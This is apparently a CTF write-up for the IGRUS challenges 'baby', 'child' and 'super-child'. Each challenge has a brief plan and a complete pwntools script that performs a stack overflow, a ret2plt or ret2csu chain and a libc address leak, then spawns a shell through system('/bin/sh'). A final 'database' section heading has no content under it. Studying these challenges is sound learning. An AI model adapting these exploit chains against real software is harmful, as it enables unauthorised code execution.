---
title: IGRUS CTF writeups
tags: ctf writeup baby igrus super-child child
---
## 0. baby
### 0-0. Scenario
Since the ``flag`` function has both ``system`` and '/bin/sh' string, theres not much to do here.

1. find pop rdi gadget
2. call system('/bin/sh')

### 0-1. Exploit

```python
from pwn import *

#gadgets
rdi = 0x4007c3

#addresses
systemplt = 0x400570
binsh = 0x4007e8

# dummy data
payload = 'a'*40

# system
payload += p64(rdi) + p64(binsh) + p64(systemplt)

r = process('./baby')

r.recvuntil('you > ')

r.sendline(payload)

r.interactive()
```

## 1. child

### 1-0. Scenario
This problem uses custom lib. So, we have to get the offset from the provided file, not from the default libc. That's pretty much it.

Since this is 32-bit binary which includes gadgets, we can easily leak the libc address.

1. leak libc addr with puts
2. return to main = get another input
3. system('/bin/sh')

### 1-1. Exploit
exploit code:
```python
from pwn import *
context.log_level='debug'

lib = ELF('libc.so.6')
binary = ELF('child')

#addresses from lib
readoff = lib.symbols['read']
systemoff = lib.symbols['system']

#binsh string location
binshoff = list(lib.search('/bin/sh'))[0]

#addresses from bin
main = binary.symbols['main']
readgot = binary.got['read']
putsplt = binary.plt['puts']

#gadgets
pop3ret = 0x8048589
popret = 0x8048589

#start process
p = process('./child', env={'LD_PRELOAD':lib.path})

#read input prompt
p.recvuntil('you > \x00')

#dummy data
payload = 'a'*36

#puts(*read@got)
payload += p32(putsplt) + p32(popret) + p32(readgot) + p32(main)

#send first payload
p.sendline(payload)

#read output and calculate libc address
readaddr = u32(p.recvn(4))
base = readaddr - readoff

#read input prompt
p.recvuntil('you > \x00')

#dummy data
payload = 'a'*36

#system(*'/bin/sh')
payload += p32(base+systemoff) + p32(0) + p32(base+binshoff)

#gdb.attach(proc.pidof(p)[0], 'b *main')

#send second payload
p.sendline(payload)

p.interactive()
```

## 2. super-child

### 2-0. Scenario
This problem is similar to previous ``child``, just that it is 64 bits and got trickier.
The binary doesn't have ``puts`` nor gadgets, so we're stuck with ``csu`` and ``write``. Other than that, it's pretty much the same thing

1. Leak libc address with write
2. return to main = get another input
3. system('/bin/sh')

### 2-1. Exploit
exploit code:
```python
from pwn import *
#context.log_level='debug'

lib = ELF('libc.so.6')
bin = ELF('super-child')

#addresses from lib
writeoff = lib.symbols['write']
systemoff = lib.symbols['system']

#binsh string location
binshoff = list(lib.search('/bin/sh'))[0]

#addresses from bin
writeplt = bin.plt['write']
writegot = bin.got['write']
main = bin.symbols['main']

#gadgets
poprdi = 0x400723
csupop = 0x40071a
csumov = 0x400700

#first payload dummy value
payload = 'a'*(0x20+8)

#write(1,*write@got,6)
payload += p64(csupop) + p64(0) + p64(1) + p64(writegot) + p64(6) + p64(writegot) + p64(1) + p64(csumov)

#return to main
payload += p64(0)*7 + p64(main)

#start process
p = process(bin.path,env={'LD_PRELOAD':lib.path})

#read input prompt
p.recvuntil('you > \x00')

#send payload
p.sendline(payload)

#read output and calculate libc base address
base = u64(p.recvn(6)+'\x00\x00') - writeoff

#gdb.attach(proc.pidof(p)[0], 'b *main')

print hex(base)

#second payload dummy value
payload = 'a'*(0x20+8)

#system('/bin/sh')
payload += p64(poprdi) + p64(base + binshoff) + p64(base + systemoff)

#read input prompt
p.recvuntil('you > \x00')

#send payload
p.sendline(payload)

p.interactive()
```

## 3. database
